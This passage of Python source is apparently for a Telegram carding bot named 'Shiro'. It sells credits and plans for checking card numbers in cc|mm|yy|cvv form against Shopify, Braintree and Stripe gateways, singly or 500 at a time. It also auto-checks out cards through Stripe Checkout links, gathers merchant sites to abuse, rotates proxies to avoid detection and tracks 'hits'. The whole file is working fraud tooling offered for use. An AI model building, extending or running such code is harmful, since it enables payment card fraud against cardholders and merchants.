                if d: dur_parts.append(f"{d} " + sc("DAY" if d == 1 else "DAYS"))
                if h: dur_parts.append(f"{h} " + sc("HOUR" if h == 1 else "HOURS"))
                if m: dur_parts.append(f"{m} " + sc("MIN"))
            dur_display = " ".join(dur_parts) or sc("INSTANT")
            redeem_msg = (
                "Ã°Å¸Å½â€° " + sc("PLAN ACTIVATED") + " Ã°Å¸Å½â€°\n\n"
                "Ã°Å¸â€™Å½ " + sc("PLAN:") + f" <b>{plan_name}</b>\n"
                "Ã¢ÂÂ± " + sc("DURATION:") + f" <b>{dur_display}</b>\n"
                "Ã¢â„¢Â¾ " + sc("CREDITS:") + " <b>" + sc("UNLIMITED") + "</b>\n\n"
                "Ã¢Å“Â¨ " + sc("ENJOY UNLIMITED CHECKS!")
            )
        else:
            new_balance = get_credits(uid)
            redeem_msg = (
                "Ã°Å¸Å½â€° " + sc("CODE REDEEMED SUCCESSFULLY") + " Ã°Å¸Å½â€°\n\n"
                "Ã°Å¸â€™Â³ " + sc("CREDITS ADDED:") + f" <b>+{credits}</b>\n"
                "Ã°Å¸â€™Â° " + sc("NEW BALANCE:") + f" <b>{new_balance}</b>\n\n"
                "Ã¢Å“Â¨ " + sc("READY TO CHECK CARDS!") + "\n"
                "Ã¢â€“Â¸ " + sc("USE") + " /sh " + sc("FOR SINGLE CHECK") + "\n"
                "Ã¢â€“Â¸ " + sc("USE") + " /msh " + sc("FOR MASS CHECK")
            )
        bot.reply_to(message, redeem_msg, parse_mode="HTML")
    else:
        # Enhanced error messages with proper formatting
        if "already redeemed" in msg.lower():
            error_msg = "Ã¢ÂÅ’ " + _to_bold_sans("CODE ALREADY REDEEMED") + "\n\n" + _to_bold_sans("YOU HAVE ALREADY USED THIS CODE")
        elif "expired" in msg.lower():
            error_msg = "Ã¢ÂÅ’ " + _to_bold_sans("CODE EXPIRED") + "\n\n" + _to_bold_sans("THIS CODE HAS REACHED MAX USES")
        elif "invalid" in msg.lower():
            error_msg = "Ã¢ÂÅ’ " + _to_bold_sans("INVALID CODE") + "\n\n" + _to_bold_sans("CODE NOT FOUND OR INCORRECT")
        elif "not found" in msg.lower():
            error_msg = "Ã¢ÂÅ’ " + _to_bold_sans("USER NOT FOUND") + "\n\n" + _to_bold_sans("PLEASE CONTACT SUPPORT")
        else:
            error_msg = "Ã¢ÂÅ’ " + _to_bold_sans("ERROR") + "\n\n" + _to_bold_sans(msg.upper())
        bot.reply_to(message, error_msg, parse_mode="HTML")


@bot.message_handler(commands=["listcodes"])
@_crash_safe
def cmd_listcodes(message):
    """List all credit codes (owner only)."""
    _log_cmd(message, "/listcodes")
    if not OWNER_IDS or getattr(message.from_user, "id", None) not in OWNER_IDS:
        bot.reply_to(message, "Owner only.")
        return
    
    codes = list_credit_codes()
    if not codes:
        bot.reply_to(message, "No credit codes found.")
        return
    
    msg = "<b>Credit Codes (Last 20)</b>\n\n"
    for code_doc in codes:
        code = code_doc.get("code", "?")
        credits = code_doc.get("credits", 0)
        max_uses = code_doc.get("max_uses", 1)
        used_count = code_doc.get("used_count", 0)
        status = "Ã¢Å“â€¦ Active" if used_count < max_uses else "Ã¢ÂÅ’ Expired"
        
        msg += f"<code>{code}</code>\n"
        msg += f"  {credits} credits Ã¢â‚¬Â¢ {used_count}/{max_uses} uses Ã¢â‚¬Â¢ {status}\n\n"
    
    bot.reply_to(message, msg, parse_mode="HTML")


@bot.message_handler(commands=["setsite"])
@_crash_safe
def cmd_setsite(message):
    _log_cmd(message, "/setsite")
    cid = message.chat.id
    text = (message.text or "").strip()
    rest = text.replace("/setsite", "").strip()
    if rest:
        lines = [x.strip() for x in rest.split("\n") if x.strip()]
        status_msg = bot.reply_to(message, "Ã°Å¸â€Â Testing sites... (0/?)")
        working, dead = _test_and_save_sites(cid, lines, status_msg)
        if working:
            out = f"Ã¢Å“â€¦ Saved <b>{len(working)}</b> working site(s) with lowest products."
        else:
            out = "Ã¢ÂÅ’ No working sites found."
        if dead:
            out += f"\nÃ¢ÂÅ’ {len(dead)} failed: " + ", ".join([s.replace("https://", "").replace("http://", "").split("/")[0] for s in dead[:5]])
            if len(dead) > 5:
                out += f" +{len(dead)-5} more"
        bot.edit_message_text(out, cid, status_msg.message_id, parse_mode="HTML")
        return
    pending_sites[cid] = time.time()
    bot.reply_to(
        message,
        "Send site URLs (one per line). I'll check for in-stock products with low prices.\n"
        "Example:\n<code>https://store1.com\nhttps://store2.com</code>\n\n"
        + _to_bold_sans("Price range: ") + f"{_to_bold_sans('$')}{MIN_SITE_PRICE:.0f} - {_to_bold_sans('$')}{MAX_SITE_PRICE:.0f}\n"
        + _to_bold_sans("Only in-stock products will be accepted"),
        parse_mode="HTML",
    )


def _test_and_save_bt_sites(cid, raw_lines, status_msg=None):
    """Test BT sites in parallel (Braintree gateway check), save working ones."""
    sites_to_test = []
    for s in raw_lines:
        s = (s or "").strip().rstrip("/")
        if not s: continue
        if not s.startswith(("http://", "https://")): s = "https://" + s
        sites_to_test.append(s)
    if not sites_to_test:
        return [], []

    proxies = get_proxies(cid)
    proxy = random.choice(proxies) if proxies else None

    if status_msg:
        try:
            bot.edit_message_text(f"Ã°Å¸â€Â Testing {len(sites_to_test)} site(s) for Braintree gateway...", cid, status_msg.message_id)
        except Exception:
            pass

    working = []
    dead = []
    workers = min(6, len(sites_to_test))

    def _check_one(site):
        try:
            ok, info = _bt_site_fast(site, proxy)
            return site, ok, info
        except Exception as e:
            return site, False, str(e)[:60]

    with ThreadPoolExecutor(max_workers=workers) as ex:
        futures = {ex.submit(_check_one, s): s for s in sites_to_test}
        for fut in as_completed(futures):
            site, ok, info = fut.result()
            if ok:
                working.append(site)
            else:
                dead.append(site)

    if working:
        existing = get_bt_sites(cid)
        combined = list(dict.fromkeys(existing + working))  # deduplicate, preserve order
        set_bt_sites(cid, combined)
    return working, dead


@bot.message_handler(commands=["btsite"])
@_crash_safe
def cmd_btsite(message):
    _log_cmd(message, "/btsite")
    cid = message.chat.id
    text = (message.text or "").strip()
    rest = text.replace("/btsite", "").strip()
    if rest:
        lines = [x.strip() for x in rest.split("\n") if x.strip()]
        status_msg = bot.reply_to(message, "Ã°Å¸â€Â Testing BT sites...")
        working, dead = _test_and_save_bt_sites(cid, lines, status_msg)
        if working:
            out = f"Ã¢Å“â€¦ Saved <b>{len(working)}</b> working Braintree site(s)."
        else:
            out = "Ã¢ÂÅ’ No working Braintree sites found."
        if dead:
            out += f"\nÃ¢ÂÅ’ {len(dead)} failed: " + ", ".join([s.replace("https://", "").replace("http://", "").split("/")[0] for s in dead[:5]])
            if len(dead) > 5:
                out += f" +{len(dead)-5} more"
        bot.edit_message_text(out, cid, status_msg.message_id, parse_mode="HTML")
        return
    pending_bt_sites[cid] = time.time()
    bot.reply_to(
        message,
        "Send WooCommerce site URLs with Braintree gateway (one per line).\n"
        "Example:\n<code>https://store1.com\nhttps://store2.com</code>\n\n"
        + _to_bold_sans("I'll verify each site has Braintree enabled."),
        parse_mode="HTML",
    )


def _bt_sites_list_message(cid, with_remove_buttons=True):
    """Build BT sites list text and optional inline keyboard."""
    sites = get_bt_sites(cid)
    if not sites:
        return "Ã°Å¸â€Â· <b>BT Sites</b>\nÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€Â\n\nNo BT sites added yet.\nUse <code>/btsite</code> to add.", None
    lines = []
    for i, s in enumerate(sites):
        domain = s.replace("https://", "").replace("http://", "").split("/")[0]
        lines.append(f"{i+1}. <code>{domain}</code>")
    text = f"Ã°Å¸â€Â· <b>BT Sites</b> ({len(sites)})\nÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€Â\n\n" + "\n".join(lines)
    if not with_remove_buttons:
        return text, None
    kb = types.InlineKeyboardMarkup()
    for i in range(0, len(sites), 4):
        kb.row(*[types.InlineKeyboardButton(f"Ã°Å¸â€”â€˜ {i+j+1}", callback_data=f"rbs_{i+j}") for j in range(4) if i+j < len(sites)])
    kb.add(types.InlineKeyboardButton("Ã°Å¸â€”â€˜ Remove All BT Sites", callback_data="rbs_all_confirm"))
    return text, kb


@bot.message_handler(commands=["btsitelist", "btremovesite"])
@_crash_safe
def cmd_btsitelist(message):
    _log_cmd(message, "/btsitelist")
    cid = message.chat.id
    text, kb = _bt_sites_list_message(cid, with_remove_buttons=True)
    if kb:
        bot.reply_to(message, text, parse_mode="HTML", reply_markup=kb)
    else:
        bot.reply_to(message, text, parse_mode="HTML")


def _test_and_save_proxies(cid, raw_lines, status_msg=None):
    """Parse proxy lines to URLs and save them directly (no connectivity test).
    Returns (saved_urls, 0) Ã¢â‚¬â€ all valid-format proxies are saved."""
    proxy_urls = _parse_proxy_lines_to_urls(raw_lines)
    if not proxy_urls:
        return [], 0
    set_proxies_from_url_list(cid, proxy_urls)
    return proxy_urls, 0


@bot.message_handler(commands=["setproxies"])
@_crash_safe
def cmd_setproxies(message):
    _log_cmd(message, "/setproxies")
    cid = message.chat.id
    text = (message.text or "").strip()
    rest = text.replace("/setproxies", "").strip()
    if rest:
        lines = [x.strip() for x in rest.replace(",", "\n").split("\n") if x.strip()]
        status_msg = bot.reply_to(message, "Ã°Å¸â€Â Testing proxies... (0/?)")
        working, failed = _test_and_save_proxies(cid, lines, status_msg)
        sc = _to_bold_sans
        proxy_lines = [f"  <code>{_proxy_display_name(p)}</code>" for p in working[:15]]
        if len(working) > 15:
            proxy_lines.append(f"  ... +{len(working) - 15} more")
        out  = f"<b>{sc('PROXY SETUP')}</b> Ã°Å¸â€â€”\n"
        out += "Ã¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€Â\n\n"
        out += f"Ã¢â€“Â¸ <b>{sc('STATUS:')}</b> Ã¢Å“â€¦ {sc('SAVED')}\n"
        out += f"Ã¢â€“Â¸ <b>{sc('WORKING:')}</b> {len(working)}\n"
        if failed:
            out += f"Ã¢â€“Â¸ <b>{sc('FAILED:')}</b> {failed}\n"
        out += f"\n<b>{sc('PROXIES:')}</b>\n" + "\n".join(proxy_lines)
        bot.edit_message_text(out, cid, status_msg.message_id, parse_mode="HTML")
        _discord_proxies_set(message, working)
        return
    pending_proxies[cid] = time.time()
    bot.reply_to(
        message,
        "Send proxies (one per line): <code>host:port:user:pass</code>\nOr comma-separated, or <code>file:proxies.txt</code>.\n"
        "I'll test each and save only <b>working</b> proxies. Multiple proxies = rotation per check.",
        parse_mode="HTML",
    )


def _sites_list_message(cid, with_remove_buttons=True):
    """Build sites list text and optional inline keyboard (remove by index + remove all)."""
    sites = get_sites(cid)
    if not sites:
        return "Ã°Å¸Å’Â <b>Sites</b>\nÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€Â\n\nNo sites added yet.\nUse <code>/setsite</code> to add.", None
    lines = []
    for i, s in enumerate(sites):
        domain = s.replace("https://", "").replace("http://", "").split("/")[0]
        lines.append(f"{i+1}. <code>{domain}</code>")
    text = f"Ã°Å¸Å’Â <b>Sites</b> ({len(sites)})\nÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€Â\n\n" + "\n".join(lines)
    if not with_remove_buttons:
        return text, None
    kb = types.InlineKeyboardMarkup()
    for i in range(0, len(sites), 4):
        kb.row(*[types.InlineKeyboardButton(f"Ã°Å¸â€”â€˜ {i+j+1}", callback_data=f"rs_{i+j}") for j in range(4) if i+j < len(sites)])
    # Remove All button
    kb.add(types.InlineKeyboardButton("Ã°Å¸â€”â€˜ Remove All Sites", callback_data="rs_all_confirm"))
    return text, kb


@bot.message_handler(commands=["sitelist", "removesite"])
@_crash_safe
def cmd_sitelist(message):
    _log_cmd(message, "/sitelist")
    cid = message.chat.id
    text, kb = _sites_list_message(cid, with_remove_buttons=True)
    if kb:
        bot.reply_to(message, text, parse_mode="HTML", reply_markup=kb)
    else:
        bot.reply_to(message, text, parse_mode="HTML")


def _proxies_list_message(cid, with_remove_buttons=True):
    """Build proxies list text and optional inline keyboard (remove by index + remove all)."""
    proxies = get_proxies(cid)
    if not proxies:
        return "Ã°Å¸â€â€ž <b>Proxies</b>\nÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€Â\n\nNo proxies added yet.\nUse <code>/setproxies</code> to add.", None
    lines = [f"{i+1}. <code>{_proxy_display_name(p)}</code>" for i, p in enumerate(proxies)]
    text = f"Ã°Å¸â€â€ž <b>Proxies</b> ({len(proxies)})\nÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€Â\n\n" + "\n".join(lines)
    if not with_remove_buttons:
        return text, None
    kb = types.InlineKeyboardMarkup()
    for i in range(0, len(proxies), 4):
        kb.row(*[types.InlineKeyboardButton(f"Ã°Å¸â€”â€˜ {i+j+1}", callback_data=f"rp_{i+j}") for j in range(4) if i+j < len(proxies)])
    # Remove All button
    kb.add(types.InlineKeyboardButton("Ã°Å¸â€”â€˜ Remove All Proxies", callback_data="rp_all_confirm"))
    return text, kb


@bot.message_handler(commands=["listproxy", "listproxies", "removeproxy", "removeproxies"])
@_crash_safe
def cmd_listproxy(message):
    _log_cmd(message, "/listproxy")
    cid = message.chat.id
    text, kb = _proxies_list_message(cid, with_remove_buttons=True)
    if kb:
        bot.reply_to(message, text, parse_mode="HTML", reply_markup=kb)
    else:
        bot.reply_to(message, text, parse_mode="HTML")


@bot.message_handler(commands=["checkproxy", "checkproxies"])
@_crash_safe
def cmd_checkproxy(message):
    _log_cmd(message, "/checkproxy")
    cid = message.chat.id
    proxies = get_proxies(cid)
    if not proxies:
        bot.reply_to(message, "Ã°Å¸â€â€ž No proxies. Use <code>/setproxies</code> to add.", parse_mode="HTML")
        return
    status_msg = bot.reply_to(message, "Ã°Å¸â€Â Testing proxies...")
    results = []
    ok = [0]
    _res_lock = threading.Lock()

    def _test_one(i_proxy):
        i, proxy_url = i_proxy
        try:
            with httpx.Client(proxy=proxy_url, timeout=10.0) as client:
                r = client.get("https://api.ipify.org?format=json")
                if r.status_code == 200:
                    with _res_lock:
                        ok[0] += 1
                        results.append((i, f"  Ã¢Å“â€¦ {i+1}. {_proxy_display_name(proxy_url)} Ã¢â‚¬â€œ OK"))
                else:
                    with _res_lock:
                        results.append((i, f"  Ã¢ÂÅ’ {i+1}. {_proxy_display_name(proxy_url)} Ã¢â‚¬â€œ HTTP {r.status_code}"))
        except Exception as e:
            with _res_lock:
                results.append((i, f"  Ã¢ÂÅ’ {i+1}. {_proxy_display_name(proxy_url)} Ã¢â‚¬â€œ {str(e)[:30]}"))

    workers = min(5, len(proxies))
    with ThreadPoolExecutor(max_workers=workers, thread_name_prefix="chkprx") as pool:
        pool.map(_test_one, enumerate(proxies))

    results.sort(key=lambda x: x[0])  # maintain original order
    result_lines = [r[1] for r in results]
    summary = f"<b>Proxies</b> {ok[0]}/{len(proxies)} OK\n" + "\n".join(result_lines[:15])
    if len(result_lines) > 15:
        summary += f"\n  ... and {len(result_lines)-15} more"
    bot.edit_message_text(summary, cid, status_msg.message_id, parse_mode="HTML")


def _main_menu_kb_with_register(uid):
    """Main menu 2x2 + Register row if not registered."""
    kb = _make_main_menu_keyboard()
    if uid and not is_registered(uid):
        kb.add(types.InlineKeyboardButton("Register", callback_data="menu_register"))
    return kb


@bot.callback_query_handler(func=lambda c: True)
@_crash_safe
def handle_callback(callback):
    # Answer callback immediately for instant feedback (only once at top)
    try:
        bot.answer_callback_query(callback.id)
    except Exception:
        pass
    
    cid = callback.message.chat.id
    mid = callback.message.message_id
    uid = getattr(callback.from_user, "id", None)
    data = (callback.data or "").strip()
    content_type = getattr(callback.message, "content_type", None) or ""
    _log_callback(callback, data)

    # Main menu actions (use caption+reply_markup when message is GIF/animation)
    if data == "menu_toolbox":
        text = (
            "Ã°Å¸â€ºÂ  <b>" + _to_bold_sans("Toolbox") + "</b>\n\n"
            "Ã°Å¸â€™Â³ <b>" + _to_bold_sans("Shopify") + "</b>\n"
            "<code>/sh</code> " + _to_bold_sans("cc|mm|yy|cvv") + "\n"
            "<code>/msh</code> " + _to_bold_sans("(mass, max 500)") + "\n\n"
            "Ã°Å¸â€Â· <b>" + _to_bold_sans("Braintree") + "</b>\n"
            "<code>/bt</code> " + _to_bold_sans("cc|mm|yy|cvv") + "\n"
            "<code>/mbt</code> " + _to_bold_sans("(mass, max 500)") + "\n\n"
            "Ã¢Å¡Â¡ <b>" + _to_bold_sans("Stripe Charge") + "</b>\n"
            "<code>/st</code> " + _to_bold_sans("cc|mm|yy|cvv") + "\n"
            "<code>/mst</code> " + _to_bold_sans("(mass, max 500)") + "\n\n"
            "Ã°Å¸â€ºâ€™ <b>" + _to_bold_sans("Auto-Checkout") + "</b>\n"
            "<code>/ac</code> " + _to_bold_sans("(stripe checkout link)") + "\n\n"
            "Ã°Å¸Å½Â <b>" + _to_bold_sans("Credits") + "</b>\n"
            "<code>/redeem</code> " + _to_bold_sans("code") + "\n\n"
            "Ã°Å¸â€Â§ <b>" + _to_bold_sans("Setup") + "</b>\n"
            "<code>/setsite</code> Ã‚Â· <code>/sitelist</code> Ã‚Â· <code>/removesite</code>\n"
            "<code>/btsite</code> Ã‚Â· <code>/btsitelist</code> Ã‚Â· <code>/btremovesite</code>\n"
            "<code>/setproxies</code> Ã‚Â· <code>/listproxy</code> Ã‚Â· <code>/removeproxy</code>\n"
            "<code>/checkproxy</code>\n\n"
            "Ã°Å¸â€ºÂ  <b>" + _to_bold_sans("Utilities") + "</b>\n"
            "<code>/bin</code> " + _to_bold_sans("xxxxxx") + " Ã‚Â· "
            "<code>/history</code>\n"
            "<code>/splittxt</code> Ã‚Â· <code>/stop</code>\n"
        )
        kb = _make_toolbox_keyboard()
        _safe_edit_menu(cid, mid, text, kb, content_type)
    elif data == "menu_ac":
        sc = _to_bold_sans
        text = (
            "Ã¢Å¡Â¡ <b>" + sc("Auto-Checkout") + "</b>\n\n"
            "Paste a Stripe Checkout link and Shiro will\n"
            "auto-checkout your cards through it.\n\n"
            "Ã¢â€“Â¸ <b>" + sc("USAGE:") + "</b>\n"
            "  1. Send <code>/ac</code>\n"
            "  2. Paste the Stripe Checkout URL\n"
            "  3. Send cards (max 10, 1 per line)\n\n"
            "Ã¢â€“Â¸ <b>" + sc("FORMAT:") + "</b> <code>cc|mm|yy|cvv</code>\n"
            "Ã¢â€“Â¸ <b>" + sc("GATE:") + "</b> " + sc("Stripe Android SDK") + "\n"
            "Ã¢â€“Â¸ <b>" + sc("COST:") + "</b> 1 credit per card"
        )
        kb = types.InlineKeyboardMarkup()
        kb.row(
            types.InlineKeyboardButton("Ã°Å¸Å¡â‚¬ " + sc("Start /ac"), callback_data="ac_start"),
            types.InlineKeyboardButton("Ã¢Â¬â€¦Ã¯Â¸Â " + sc("Back"), callback_data="menu_toolbox"),
        )
        _safe_edit_menu(cid, mid, text, kb, content_type)
    elif data == "ac_start":
        # Trigger the /ac flow Ã¢â‚¬â€ set pending state
        if uid and is_registered(uid):
            pending_ac_link[cid] = time.time()
            try:
                bot.send_message(cid, "Send a Stripe Checkout URL (e.g. <code>https://checkout.stripe.com/c/pay/cs_live_...</code>)", parse_mode="HTML")
            except Exception:
                pass
    elif data.startswith("msh_stop_"):
        # Stop mass check from inline button
        try:
            stop_cid = int(data.split("_")[2])
            _stop_flags[stop_cid] = True
        except Exception:
            pass
    elif data == "menu_stats":
        # Use cached data for instant response
        sites_count = len(user_sites.get(cid, []))
        bt_sites_count = len(bt_user_sites.get(cid, []))
        proxies_count = len(user_proxies.get(cid, []))
        
        checks_done = 0
        hits_done = 0
        cred = 0
        if uid:
            user_data = _get_cached_user_data(uid)
            if user_data:
                cred = user_data["credits"]
                checks_done = user_data["total_checks"]
                hits_done = user_data.get("total_hits", 0)
        
        hit_rate = (hits_done / checks_done * 100) if checks_done > 0 else 0.0
        text = (
            "Ã°Å¸â€œÅ  <b>" + _to_bold_sans("Statistics") + "</b>\n\n"
            f"Ã°Å¸â€™Â° <b>" + _to_bold_sans("Credits:") + f"</b> {cred}\n"
            f"Ã¢Å“â€¦ <b>" + _to_bold_sans("Checks:") + f"</b> {checks_done}\n"
            f"Ã°Å¸â€Â¥ <b>" + _to_bold_sans("Hits:") + f"</b> {hits_done}\n"
            f"Ã°Å¸Å½Â¯ <b>" + _to_bold_sans("Hit Rate:") + f"</b> {hit_rate:.1f}%\n\n"
            f"Ã°Å¸Å’Â <b>" + _to_bold_sans("Shopify Sites:") + f"</b> {sites_count}\n"
            f"Ã°Å¸â€Â· <b>" + _to_bold_sans("BT Sites:") + f"</b> {bt_sites_count}\n"
            f"Ã°Å¸â€â€ž <b>" + _to_bold_sans("Proxies:") + f"</b> {proxies_count}\n"
        )
        kb = types.InlineKeyboardMarkup()
        kb.add(types.InlineKeyboardButton("Ã¢Â¬â€¦Ã¯Â¸Â " + _to_bold_sans("Back"), callback_data="menu_back"))
        _safe_edit_menu(cid, mid, text, kb, content_type)
    elif data == "menu_profile":
        if not uid:
            text = "Ã¢ÂÅ’ " + _to_bold_sans("Could not get user.")
            kb = types.InlineKeyboardMarkup()
            kb.add(types.InlineKeyboardButton("Ã¢Â¬â€¦Ã¯Â¸Â " + _to_bold_sans("Back"), callback_data="menu_back"))
        else:
            # Use cached data for instant response
            user_data = _get_cached_user_data(uid)
            
            if not user_data:
                text = "Ã¢Å¡Â Ã¯Â¸Â " + _to_bold_sans("Not registered. Use") + " <code>/register</code> " + _to_bold_sans("or press Register below.")
                kb = types.InlineKeyboardMarkup()
                kb.add(types.InlineKeyboardButton("Ã¢Å“Â¨ " + _to_bold_sans("Register"), callback_data="menu_register"))
                kb.add(types.InlineKeyboardButton("Ã¢Â¬â€¦Ã¯Â¸Â " + _to_bold_sans("Back"), callback_data="menu_back"))
            else:
                cred = user_data["credits"]
                reg_date = user_data["registered_at"][:10] if user_data["registered_at"] else "Ã¢â‚¬â€"
                checks_done = user_data["total_checks"]
                hits_done = user_data.get("total_hits", 0)
                
                # Get username (no DB query)
                username = callback.from_user.username if callback.from_user.username else None
                user_display = f"@{username}" if username else f"Ã‰ÂªÃ¡Â´â€¦: {uid}"
                
                # Plan info
                user_plan = _get_user_plan_name(uid)
                if user_plan:
                    plan_name = PLANS.get(user_plan, {}).get("name", user_plan.title())
                    plan_line = f"Ã°Å¸â€™Å½ <b>" + _to_bold_sans("Plan:") + f"</b> {plan_name}\n"
                    cred_display = "Ã¢â„¢Â¾ " + _to_bold_sans("Unlimited")
                else:
                    plan_line = ""
                    cred_display = str(cred)
                
                text = (
                    "Ã°Å¸â€˜Â¤ <b>" + _to_bold_sans("Profile") + "</b>\n\n"
                    f"Ã°Å¸â€˜Â¤ <b>" + _to_bold_sans("User:") + f"</b> {user_display}\n"
                    + plan_line +
                    f"Ã°Å¸â€™Â° <b>" + _to_bold_sans("Credits:") + f"</b> {cred_display}\n"
                    f"Ã¢Å“â€¦ <b>" + _to_bold_sans("Checks:") + f"</b> {checks_done}\n"
                    f"Ã°Å¸â€Â¥ <b>" + _to_bold_sans("Hits:") + f"</b> {hits_done}\n"
                    f"Ã°Å¸â€œâ€¦ <b>" + _to_bold_sans("Joined:") + f"</b> {reg_date}\n"
                )
                kb = types.InlineKeyboardMarkup()
                kb.add(types.InlineKeyboardButton("Ã¢Â¬â€¦Ã¯Â¸Â " + _to_bold_sans("Back"), callback_data="menu_back"))
        
        _safe_edit_menu(cid, mid, text, kb, content_type)
    elif data == "menu_gates":
        sc = _to_bold_sans
        
        shopify_status = "Ã°Å¸Å¸Â¢ " + sc("ONLINE") if True else "Ã°Å¸â€Â´ " + sc("OFFLINE")
        braintree_status = "Ã°Å¸Å¸Â¢ " + sc("ONLINE") if _HAS_BT else "Ã°Å¸â€Â´ " + sc("OFFLINE")
        stripe_ac_status = "Ã°Å¸Å¸Â¢ " + sc("ONLINE")
        stripe_chg_status = "Ã°Å¸Å¸Â¢ " + sc("ONLINE") if _HAS_ST else "Ã°Å¸â€Â´ " + sc("OFFLINE")
        
        text = (
            "Ã°Å¸â€Â <b>" + sc("API Status") + "</b>\n\n"
            "Ã°Å¸â€™Â³ <b>" + sc("Shopify:") + "</b> " + shopify_status + "\n"
            "Ã°Å¸â€Â· <b>" + sc("Braintree:") + "</b> " + braintree_status + "\n"
            "Ã¢Å¡Â¡ <b>" + sc("Stripe AC:") + "</b> " + stripe_ac_status + "\n"
            "Ã¢Å¡Â¡ <b>" + sc("Stripe Charge:") + "</b> " + stripe_chg_status + "\n"
        )
        
        kb = types.InlineKeyboardMarkup()
        kb.add(types.InlineKeyboardButton("Ã¢Â¬â€¦Ã¯Â¸Â " + _to_bold_sans("Back"), callback_data="menu_back"))
        
        _safe_edit_menu(cid, mid, text, kb, content_type)
    elif data == "menu_plans":
        sc = _to_bold_sans
        # Check if user has active plan
        user_plan = _get_user_plan_name(uid) if uid else None
        if user_plan:
            plan_info = PLANS.get(user_plan, {})
            udata = _get_cached_user_data(uid)
            exp = udata.get("plan_expires", "") if udata else ""
            exp_short = exp[:10] if exp else "Ã¢â‚¬â€"
            plan_line = f"\nÃ¢Å“â€¦ " + sc("YOUR PLAN:") + f" <b>{plan_info.get('name', user_plan.title())}</b>\nÃ¢ÂÂ± " + sc("EXPIRES:") + f" <b>{exp_short}</b>\n"
        else:
            plan_line = ""
        text = (
            "Ã°Å¸â€™Å½ <b>" + sc("Premium Plans") + "</b>\n" + plan_line + "\n"
            "<b>" + sc("Basic Plan") + "</b> - " + sc("$5/month") + "\n"
            "Ã¢â‚¬Â¢ " + sc("Unlimited credits") + "\n"
            "Ã¢â‚¬Â¢ " + sc("Unlimited checks") + "\n"
            "Ã¢â‚¬Â¢ " + sc("Basic support") + "\n\n"
            "<b>" + sc("Pro Plan") + "</b> - " + sc("$15/month") + "\n"
            "Ã¢â‚¬Â¢ " + sc("Unlimited credits") + "\n"
            "Ã¢â‚¬Â¢ " + sc("Unlimited checks") + "\n"
            "Ã¢â‚¬Â¢ " + sc("Priority support") + "\n"
            "Ã¢â‚¬Â¢ " + sc("Custom gates") + "\n\n"
            "<i>" + sc("Contact @ishirochen to upgrade") + "</i>"
        )
        kb = types.InlineKeyboardMarkup()
        kb.add(types.InlineKeyboardButton("Ã¢Â¬â€¦Ã¯Â¸Â " + _to_bold_sans("Back"), callback_data="menu_back"))
        _safe_edit_menu(cid, mid, text, kb, content_type)
    elif data == "menu_support":
        text = (
            "Ã°Å¸â€™Â¬ <b>" + _to_bold_sans("Support") + "</b>\n\n"
            + _to_bold_sans("Need help? Contact us:") + "\n\n"
            "Ã°Å¸â€™Â¬ <b>" + _to_bold_sans("Chat:") + "</b> @ShiroSupportchat\n"
            "Ã°Å¸â€˜Â¤ <b>" + _to_bold_sans("Telegram:") + "</b> @ShiroSupport"
        )
        kb = types.InlineKeyboardMarkup()
        kb.add(types.InlineKeyboardButton("Ã¢Â¬â€¦Ã¯Â¸Â " + _to_bold_sans("Back"), callback_data="menu_back"))
        _safe_edit_menu(cid, mid, text, kb, content_type)
    elif data == "menu_register":
        if not uid:
            _safe_edit_menu(cid, mid, "Ã¢ÂÅ’ Could not get user ID.", _main_menu_kb_with_register(uid), content_type)
        else:
            cb_uname = getattr(callback.from_user, "username", None)
            cb_fname = getattr(callback.from_user, "first_name", None)
            # Check cache first
            user_data = _get_cached_user_data(uid)
            if user_data:
                cred = user_data["credits"]
                update_user_activity(uid, username=cb_uname, first_name=cb_fname)
                _safe_edit_menu(cid, mid, f"Ã¢Å“â€¦ Already registered.\nÃ°Å¸â€™Â° Credits: <b>{cred}</b>", _main_menu_kb_with_register(uid), content_type)
            elif register_user(uid, username=cb_uname, first_name=cb_fname):
                _safe_edit_menu(cid, mid, f"Ã¢Å“â€¦ Registered!\nÃ°Å¸â€™Â° Credits: <b>{INITIAL_CREDITS}</b>", _main_menu_kb_with_register(uid), content_type)
            else:
                _safe_edit_menu(cid, mid, "Ã¢ÂÅ’ Registration failed (DB error).", _main_menu_kb_with_register(uid), content_type)
    elif data == "menu_back":
